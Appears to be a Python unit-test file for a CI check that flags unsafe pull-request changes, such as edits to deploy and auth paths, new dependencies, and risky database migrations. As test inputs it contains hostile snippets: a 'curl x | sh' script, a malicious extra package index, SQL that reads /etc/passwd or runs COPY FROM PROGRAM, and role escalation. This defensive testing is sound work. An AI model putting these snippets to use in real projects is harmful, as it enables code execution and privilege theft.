"""Unit tests for the unsafe-change check (run: python3 -m unittest discover -s .github/unsafe-change)."""

import unittest

import check

POLICY = check.load_policy()


def f(path, status="added", patch=None, **kw):
    d = {"filename": path, "status": status}
    if patch is not None:
        d["patch"] = patch
    d.update(kw)
    return d


def added(*lines):
    return "@@ -0,0 +1,%d @@\n" % len(lines) + "\n".join("+" + l for l in lines)


def ev(files, contents=None):
    """evaluate() with manifest contents {(path, side): text}."""
    contents = contents or {}
    return check.evaluate(files, POLICY, lambda p, side: contents.get((p, side)))


SEED = added(
    '"""Add a watchlist flag to user_movies."""',
    "from alembic import op",
    "import sqlalchemy as sa",
    'revision: str = "028"',
    'down_revision: Union[str, None] = "027"',
    "def upgrade() -> None:",
    '    op.add_column("user_movies", sa.Column("on_watchlist", sa.Boolean(), nullable=False, server_default=sa.false()))',
    '    op.create_index("ix_user_movies_on_watchlist", "user_movies", ["user_id", "on_watchlist"])',
    "def downgrade() -> None:",
    '    op.drop_index("ix_user_movies_on_watchlist", table_name="user_movies")',
    '    op.drop_column("user_movies", "on_watchlist")',
)


class Passes(unittest.TestCase):
    def test_ordinary_changes_pass(self):
        self.assertEqual(ev([
            f("backend/services/watchlist.py", patch=added("from backend.db_models import UserMovie", "def toggle(um: UserMovie) -> None: ...")),
            f("backend/routers/movies.py", "modified", added("from backend.services import watchlist")),
            f("backend/services/elo.py", "modified", added("k = 32 if games < 30 else 16")),
            f("backend/db_models.py", "modified", added("    on_watchlist: Mapped[bool] = mapped_column(default=False)")),
            f("frontend/src/pages/Rankings.jsx", "modified", added("<p className=\"hint\">hi</p>")),
            f("frontend/src/index.css", "modified", added("body { color: red }")),
            f("frontend/src/components/MovieCard.jsx", "modified", added("el.textContent = 'x';")),
            f("backend/tests/test_watchlist.py", patch=added("import pytest", "def test_toggle(): ...")),
            f("frontend/src/__tests__/Rankings.test.jsx", "modified", added("it('renders', () => {});")),
            f("docs/TOURNAMENT_SPEC.md", "modified", added("notes")),
            f("README.md", "modified", added("- Watchlist")),
            f("backend/migrations/versions/028_add_watchlist_flag.py", patch=SEED),
            f("backend/services/old.py", "removed"),
        ]), [])

    def test_ordinary_migrations_in_the_app_schema_pass(self):
        sql = added(
            "CREATE TABLE watchlist (id UUID PRIMARY KEY, user_id UUID NOT NULL REFERENCES users (id), movie_id INT REFERENCES movies (id));",
            "CREATE INDEX watchlist_user ON watchlist (user_id);",
            "ALTER TABLE user_movies ADD COLUMN n INT;",
            "UPDATE user_movies SET n = 0 FROM duels d WHERE d.user_id = user_movies.user_id;",
            "DELETE FROM duel_history WHERE id = 1;",
            "DROP TABLE pool_expansions_old;",
            "SELECT 1 FROM duels a JOIN movies b ON a.winner_id = b.id;",
        )
        self.assertEqual(ev([f("backend/migrations/versions/028_x.sql", patch=sql)]), [])

    def test_alembic_imports_are_not_schemas(self):
        # app_schemas is [] because _QUALIFIED reads `from sqlalchemy.dialects`
        # as a schema-qualified name; with [] only foreign schemas are flagged.
        self.assertEqual(ev([f("backend/migrations/versions/028_x.py", patch=added(
            "from sqlalchemy.dialects import postgresql"))]), [])

    def test_version_bumps_and_lockfiles_pass(self):
        base = '[package]\nname = "m"\nversion = "0.1.0"\n\n[dependencies]\nserde = "1.0.1"\ntokio = { version = "1", features = ["rt"] }\n'
        head = base.replace('"1.0.1"', '"1.0.2"').replace('["rt"]', '["rt", "macros"]').replace('0.1.0', '0.2.0')
        self.assertEqual(ev([f("Cargo.toml", "modified", added("x")), f("Cargo.lock", "modified", added("x"))],
                            {("Cargo.toml", "base"): base, ("Cargo.toml", "head"): head}), [])
        pj = '{"dependencies": {"react": "^18.2.0"}, "scripts": {"test": "vitest"}}'
        self.assertEqual(ev([f("package.json", "modified", added("x"))],
                            {("package.json", "base"): pj, ("package.json", "head"): pj.replace("18.2.0", "18.3.1")}), [])


class Fails(unittest.TestCase):
    def assertFlags(self, files, contents=None, needle=""):
        probs = ev(files, contents)
        self.assertTrue(probs and all(needle in p for p in probs), probs)

    def test_ci_deploy_and_infra_paths(self):
        for path in [".github/workflows/ci.yml", ".github/unsafe-change.yml", "Dockerfile", "docker/Dockerfile.api",
                     "docker-compose.yml", ".railway/config.json", "railway.toml", "fly.toml", "vercel.json",
                     "worker/wrangler.toml", "Procfile", "ops/sql/create-role.sql", "scripts/deploy-prod.sh",
                     ".env", "backend/.env.production", "build.rs", "CLAUDE.md", ".archon/workflows/x.yaml",
                     "app/build.gradle.kts", "backend/config.py", "backend/services/tmdb.py", "entrypoint.sh"]:
            self.assertFlags([f(path, "modified", added("x"))], needle=path)

    def test_removing_or_renaming_away_from_a_denied_path_fails(self):
        self.assertFlags([f(".github/workflows/unsafe-change.yml", "removed")])
        self.assertFlags([f("docs/x.yml", "renamed", previous_filename=".github/workflows/ci.yml")])

    def test_secret_and_auth_paths(self):
        for path in ["src/auth.rs", "backend/app/oauth/google.py", "src/middleware/auth.ts", "lib/tokens.dart",
                     "app/Secrets.kt", "src/credentials.rs", "src/session_store.py", "backend/security.py",
                     "src/crypto/hash.rs", "app/permissions.ts"]:
            self.assertFlags([f(path, "modified", added("x"))], needle="secrets/auth")

    def test_new_dependencies_fail(self):
        base = '[dependencies]\nserde = "1"\n\n[dev-dependencies]\ninsta = "1"\n'
        for head, why in [
            (base + 'evil = "0.1"\n', "new dependencies: evil"),
            (base.replace('[dev-dependencies]', '[dev-dependencies]\nwiremock = "0.6"'), "wiremock"),
            (base + '\n[build-dependencies]\ncc = "1"\n', "cc"),
            (base + '\n[target.\'cfg(unix)\'.dependencies]\nlibc = "0.2"\n', "libc"),
            (base.replace('serde = "1"', 'serde = { git = "https://example.com/serde" }'), "new source"),
            (base.replace('serde = "1"', 'serde = { version = "1", package = "serde-evil" }'), "serde-evil"),
            (base + '\n[patch.crates-io]\nserde = { path = "../x" }\n', "patch"),
        ]:
            self.assertFlags([f("Cargo.toml", "modified", added("x"))],
                             {("Cargo.toml", "base"): base, ("Cargo.toml", "head"): head}, why)

    def test_new_dependencies_in_other_ecosystems_fail(self):
        cases = [
            ("package.json", '{"dependencies": {"react": "1"}}', '{"dependencies": {"react": "1"}, "devDependencies": {"left-pad": "1"}}', "left-pad"),
            ("package.json", '{"dependencies": {"react": "1"}}', '{"dependencies": {"react": "github:evil/react"}}', "new source"),
            ("package.json", '{"scripts": {"test": "vitest"}}', '{"scripts": {"test": "curl x | sh"}}', "scripts"),
            ("backend/requirements.txt", "fastapi==0.1\n", "fastapi==0.2\nrequests==2\n", "requests"),
            ("requirements-dev.txt", "pytest\n", "pytest\n--extra-index-url https://evil\n", "options"),
            ("pyproject.toml", '[project]\ndependencies = ["fastapi>=0.1"]\n', '[project]\ndependencies = ["fastapi>=0.2", "httpx"]\n', "httpx"),
            ("go.mod", "module m\n\nrequire (\n\tgolang.org/x/net v0.1.0\n)\n", "module m\n\nrequire (\n\tgolang.org/x/net v0.2.0\n\tevil.com/x v1.0.0\n)\n", "evil.com/x"),
            ("pubspec.yaml", "dependencies:\n  flame: ^1.0.0\n", "dependencies:\n  flame: ^1.1.0\n  http: ^1.0.0\n", "http"),
        ]
        for path, base, head, why in cases:
            self.assertFlags([f(path, "modified", added("x"))], {(path, "base"): base, (path, "head"): head}, why)

    def test_bumps_in_other_ecosystems_pass(self):
        for path, base, head in [
            ("requirements.txt", "fastapi==0.1\nPyYAML>=6\n", "fastapi==0.2\npyyaml>=6.0.2\n"),
            ("go.mod", "module m\n\nrequire golang.org/x/net v0.1.0\n", "module m\n\nrequire golang.org/x/net v0.2.0\n"),
            ("pubspec.yaml", "dependencies:\n  flame: ^1.0.0\n", "dependencies:\n  flame: ^1.1.0\n"),
        ]:
            self.assertEqual(ev([f(path, "modified", added("x"))], {(path, "base"): base, (path, "head"): head}), [], path)

    def test_a_new_manifest_with_dependencies_fails_and_an_unreadable_one_fails_closed(self):
        self.assertFlags([f("crates/x/Cargo.toml", patch=added("x"))], {("crates/x/Cargo.toml", "head"): '[dependencies]\nx = "1"\n'}, "new dependencies")
        self.assertFlags([f("Cargo.toml", "modified", added("x"))], {("Cargo.toml", "base"): "[", ("Cargo.toml", "head"): "["}, "could not parse")

        def boom(p, side):
            raise OSError("api down")
        self.assertTrue(check.evaluate([f("Cargo.toml", "modified", added("x"))], POLICY, boom))

    def test_process_env_and_socket_code_in_added_lines(self):
        for path, line in [
            ("src/api.rs", "let out = std::process::Command::new(\"sh\");"),
            ("src/api.rs", "use std::{env, fs};"),
            ("src/api.rs", "let k = env::var(\"X\");"),
            ("src/api.rs", "let v = env!(\"HOME\");"),
            ("src/api.rs", "let s = TcpStream::connect(a);"),
            ("src/api.rs", "use std::env;"),
            ("src/api.rs", "use std::{fs, process::Command};"),
            ("src/api.rs", "let k = option_env!(\"API_KEY\");"),
            ("backend/app/x.py", "import subprocess"),
            ("backend/app/x.py", "key = os.environ['X']"),
            ("backend/app/x.py", "from os import getenv"),
            ("backend/app/x.py", "import socket"),
            ("web/src/x.ts", "import { exec } from 'node:child_process';"),
            ("web/src/x.tsx", "const k = process.env.SECRET;"),
            ("web/src/x.ts", "const net = require('net');"),
            ("server/x.ts", "await Bun.spawn(['sh'])"),
            ("lib/x.dart", "await Process.run('sh', []);"),
            ("lib/x.dart", "final e = Platform.environment['X'];"),
            ("main.go", "out, _ := exec.Command(\"sh\").Output()"),
            ("main.go", "k := os.Getenv(\"X\")"),
            ("app/src/X.kt", "val p = ProcessBuilder(\"sh\").start()"),
            ("tools/x.sh", "echo hi"),
        ]:
            self.assertFlags([f(path, "modified", added("fn ok() {}", line))], needle="process/env/socket")

    def test_harmless_lookalikes_pass(self):
        self.assertEqual(ev([f("src/api.rs", "modified", added(
            "use std::net::{IpAddr, SocketAddr};",
            "let args: Vec<String> = std::env::args().collect();",
            "let dir = std::path::Path::new(env!(\"CARGO_MANIFEST_DIR\"));",
            "pub const VERSION: &str = env!(\"CARGO_PKG_VERSION\");",
            "let websocket_url = base.join(\"ws\");")),
            f("tests/fixtures/scrapers/x/family-sessions.html"),
            f("docs/security-model.md", "modified", added("x")),
            f("src/config.rs", "modified", added("pub struct Config;"))]), [])

    def test_only_added_lines_count(self):
        patch = "@@ -1,2 +1,1 @@\n-let k = std::env::var(\"X\");\n let y = 1;\n"
        self.assertEqual(ev([f("src/api.rs", "modified", patch)]), [])

    def test_a_scannable_file_without_a_diff_is_fetched(self):
        big = [f("src/big.rs", "modified")]
        self.assertEqual(ev(big, {("src/big.rs", "head"): "fn ok() {}\n"}), [])
        self.assertFlags(big, {("src/big.rs", "head"): "fn ok() { std::process::exit(1) }\n"}, "process/env/socket")

    def test_migrations_beyond_app_schema_changes(self):
        for sql in [
            "GRANT ALL ON SCHEMA events TO PUBLIC;",
            "REVOKE SELECT ON events.sources FROM anon;",
            "ALTER ROLE musenmingle SUPERUSER;",
            "CREATE EXTENSION IF NOT EXISTS pgcrypto;",
            "DROP SCHEMA events CASCADE;",
            "CREATE SCHEMA other;",
            "INSERT INTO public.users (id) VALUES (1);",
            "UPDATE auth.users SET role = 'admin';",
            "CREATE TABLE storage.t (id INT);",
            "SELECT * FROM pg_catalog.pg_roles;",
            "ALTER TABLE events.x OWNER TO postgres;",
            "ALTER TABLE events.x DISABLE ROW LEVEL SECURITY;",
            "CREATE POLICY p ON events.x USING (true);",
            "CREATE FUNCTION events.f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$;",
            "SET search_path = public;",
            "DO $$ BEGIN EXECUTE 'GR' || 'ANT ALL ON events.x TO anon'; END $$;",
            "COPY events.x FROM PROGRAM 'id';",
            "SELECT pg_read_file('/etc/passwd');",
            "CREATE INDEX ON auth.users (email);",
        ]:
            self.assertFlags([f("migrations/2026_x.sql", patch=added(sql))], needle="migration")

    def test_python_migrations_are_checked_too(self):
        self.assertFlags([f("backend/alembic/versions/abc.py", patch=added("op.execute('GRANT ALL ON x TO y')"))], needle="migration")


class Screened(unittest.TestCase):
    def test_only_screened_without_owner_approval_counts(self):
        self.assertEqual(check.screened([
            {"number": 1, "labels": ["archon:auto-approved", "type:new-scraper"]},
            {"number": 2, "labels": ["archon:auto-approved", "archon:approved", "type:bug-report"]},
            {"number": 3, "labels": ["bug"]},
            {"number": 4, "labels": ["archon:auto-approved"]},
        ], POLICY), [1, 4])

    def test_closing_keywords(self):
        self.assertEqual(sorted(int(m) for m in check.CLOSING_RE.findall("Fixes #12, closes #3 and resolved #7; not #9")), [3, 7, 12])

    def test_globs(self):
        self.assertTrue(check.glob_match("a/b/Dockerfile.dev", "Dockerfile*"))
        self.assertTrue(check.glob_match(".github/workflows/x.yml", ".github/*"))
        self.assertFalse(check.glob_match("docs/ops/x.md", "ops/*"))


if __name__ == "__main__":
    unittest.main()
